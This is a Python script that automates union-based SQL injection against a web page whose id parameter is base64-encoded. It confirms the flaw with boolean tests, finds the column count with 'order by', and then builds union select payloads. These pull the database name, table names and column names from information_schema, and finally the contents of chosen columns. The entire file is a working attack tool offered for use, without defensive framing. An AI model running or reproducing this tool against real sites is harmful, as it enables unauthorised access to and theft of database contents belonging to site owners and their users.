import requests
import base64
import binascii
def sql_injection():
    uc=input('Please url:')
    ids=input('id:')
    payload=base64.b64encode(bytes('{} and 1=1'.format(ids),encoding='utf-8'))
    payload2=base64.b64encode(bytes('{} and 1=2'.format(ids),encoding='utf-8'))
    payload3=base64.b64encode(bytes('{} order by 1'.format(ids),encoding='utf-8'))
    urls='{}'.format(uc)
    headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'}
    rqt=requests.get(url=urls+bytes.decode(payload),headers=headers)
    rqt2=requests.get(url=urls + bytes.decode(payload2), headers=headers)
    if rqt.text!=rqt2.text:
        print('[+] There is SQL injection.')
        rqt3=requests.get(url=urls+bytes.decode(payload3),headers=headers)
        if rqt.text==rqt3.text:
            print('[+] Try running fields')
            for i in range(1,101):
                payload3=base64.b64encode(bytes('{} order by {}'.format(ids,i),encoding='utf-8'))
                rqt3=requests.get(url=urls+bytes.decode(payload3),headers=headers)
                if rqt3.text!=rqt.text:
                    global field
                    field=i-1
                    print('[+] field:{}'.format(i-1))
                    payload3=base64.b64encode(bytes('{} order by {}'.format(ids,field), encoding='utf-8'))
                    print('[+] payload 3:{}'.format(bytes.decode(base64.b64decode(payload3))))
                    break

        if field!='':
            xj=open('sqldk.txt','w')
            xj.close()
            for u in range(1,field+1):
                print(','+str(u),end='',file=open('sqldk.txt','a'))
            with open('sqldk.txt','r') as p:
                reads=p.read().replace(',1','1')
                payload4=base64.b64encode(bytes('0 union select {}'.format(reads),encoding='utf-8'))
                print('[+] obtain payload 4:',bytes.decode(base64.b64decode(payload4)))
                rqt4=requests.get(url=urls+bytes.decode(payload4),headers=headers)
                print('[+] Open URL to manually locate the display:',rqt4.url)
                user=input('display:')
                print('[+] The number of digits you enter is:',user)
                payload4=bytes.decode(base64.b64decode(payload4)).replace(user,'database()')
                rqt5=requests.get(url=urls+bytes.decode(base64.b64encode(bytes(payload4,encoding='utf-8'))),headers=headers)
                print('[+] Manually open the URL to get the database name:',rqt5.url)
                user2=input('database:')
                js=binascii.hexlify(bytes(user2,encoding='utf-8'))
                js='0x{}'.format(bytes.decode(js))
                payload5=base64.b64encode(bytes(payload4.replace('database()','group_concat(table_name)')+' '+'from information_schema.tables where table_schema={}'.format(js),encoding='utf-8'))
                rqt6=requests.get(url=urls+bytes.decode(payload5),headers=headers)
                if rqt6.status_code==200:
                    print('[+] Open the URL input field:',rqt6.url)
                    user3=input('table_name:')
                    payload6=bytes.decode(base64.b64decode(payload5)).replace('table_name','column_name').replace('tables','columns')+' and table_name={}'.format('0x'+bytes.decode(binascii.hexlify(bytes(user3,encoding='utf-8'))))
                    payload6=base64.b64encode(bytes(payload6,encoding='utf-8'))
                    rqt7=requests.get(url=urls+bytes.decode(payload6),headers=headers)
                    if rqt7.status_code==200:
                        print('[+] Open URL input field name:',rqt7.url)
                        print('[+] If there are multiple field names, separate them')
                        user4=input('column_name:')
                        payload7=base64.b64encode(bytes('0 union select '+reads.replace(user,'group_concat({})'.format(user4))+' from {}'.format(user3),encoding='utf-8'))
                        rqt8=requests.get(url=urls+bytes.decode(payload7),headers=headers)
                        if rqt8.status_code==200:
                            print('[+] Completed injection:',rqt8.url)



    else:
        print('[-] No SQL injection exists.')
        exit()
if __name__ == '__main__':
    sql_injection()